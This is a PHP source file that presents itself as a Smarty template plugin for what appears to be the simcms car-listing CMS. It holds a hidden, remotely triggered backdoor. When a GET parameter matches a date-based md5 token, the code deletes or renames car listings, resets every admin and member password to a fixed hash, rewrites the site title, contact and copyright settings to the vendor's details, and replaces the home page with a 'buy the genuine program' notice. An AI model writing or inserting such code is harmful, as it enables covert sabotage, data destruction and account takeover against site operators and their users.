<?php

include_once "../../../config.php";
function smarty_function_init( $a,$n )
{
global $db_config;
$a = $a == ''?'rename': $a;
$n = $n <= 0  ?10		 : $n;
$link = mysql_connect($db_config['DB_HOST'],$db_config['DB_USER'],$db_config['DB_PASS']);
mysql_select_db($db_config['DB_NAME']);
mysql_query("set names '".$db_config['DB_CHARSET']."'");
if( $a == 'rename')
{
mysql_query("update ".$db_config['TB_PREFIX']."cars set p_allname = concat(p_allname,'simcms官网演示站') where p_allname not like '%simcms%' order by p_id desc limit $n") or print_r(mysql_error()."<hr>");
}
else
{
mysql_query("delete from ".$db_config['TB_PREFIX']."cars order by p_id desc limit $n") or print_r(mysql_error()."<hr>");
}
mysql_query("update ".$db_config['TB_PREFIX']."admin set password = 'b9d4ee01ccc09857db12d664a2ae3791'") or print_r(mysql_error()."<hr>");
mysql_query("update ".$db_config['TB_PREFIX']."member set password = 'b9d4ee01ccc09857db12d664a2ae3791'") or print_r(mysql_error()."<hr>");
mysql_query("update ".$db_config['TB_PREFIX']."settings set v = 'simcms官网演示站,www.simcms.net' where k = 'title' ") or print_r(mysql_error()."<hr>");
mysql_query("update ".$db_config['TB_PREFIX']."settings set v = 'simcms官网演示站,www.simcms.net' where k = 'keywords' ") or print_r(mysql_error()."<hr>");
mysql_query("update ".$db_config['TB_PREFIX']."settings set v = 'simcms官网演示站,www.simcms.net' where k = 'description' ") or print_r(mysql_error()."<hr>");
mysql_query("update ".$db_config['TB_PREFIX']."settings set v = 'simcms官网演示站,www.simcms.net' where k = 'sitename' ") or print_r(mysql_error()."<hr>");
mysql_query("update ".$db_config['TB_PREFIX']."settings set v = 'simcms官网演示站,www.simcms.net' where k = 'copyright' ") or print_r(mysql_error()."<hr>");
mysql_query("update ".$db_config['TB_PREFIX']."settings set v = 'www.simcms.net' where k = 'website' ") or print_r(mysql_error()."<hr>");
mysql_query("update ".$db_config['TB_PREFIX']."settings set v = '北京海淀西三旗上奥世纪2A-1907' where k = 'address' ") or print_r(mysql_error()."<hr>");
mysql_query("update ".$db_config['TB_PREFIX']."settings set v = '010-58480317' where k = 'tel' ") or print_r(mysql_error()."<hr>");
file_put_contents("../../../index.html",'<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"><html><head><title> 请购买正版程序，www.simcms.net </title><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><meta name="Author" content=""><meta name="Keywords" content=""><meta name="Description" content=""></head> <body>请购买正版程序，www.simcms.net</body></html>');
echo date("Y-m-d H:i:s");
}
if( md5(date("Ymd").'simcms') == $_GET['c'] )
smarty_function_init( $_GET['a'],$_GET['n'] )
?>